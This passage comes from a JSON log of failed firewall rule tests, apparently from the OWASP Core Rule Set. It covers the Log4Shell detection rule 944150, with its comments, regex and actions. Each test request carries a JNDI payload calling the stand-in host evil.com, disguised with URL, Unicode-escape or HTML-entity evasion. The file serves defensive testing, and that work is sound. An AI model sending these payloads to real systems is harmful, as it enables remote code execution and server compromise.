        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 9,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with URL encoding evasion",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "Log4J exploit on JSON with URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 10,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with Unicode escape evasion, uppercase",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 10,
      "desc" : "Log4J exploit on JSON with Unicode escape evasion, uppercase",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u007Bjndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 11,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with Unicode escape evasion, lowercase",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 11,
      "desc" : "Log4J exploit on JSON with Unicode escape evasion, lowercase",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u007bjndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 12,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion, lower case",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 12,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion, lower case",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$&lbrace;jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 13,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion, upper case",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 13,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion, upper case",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$&LBRACE;jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
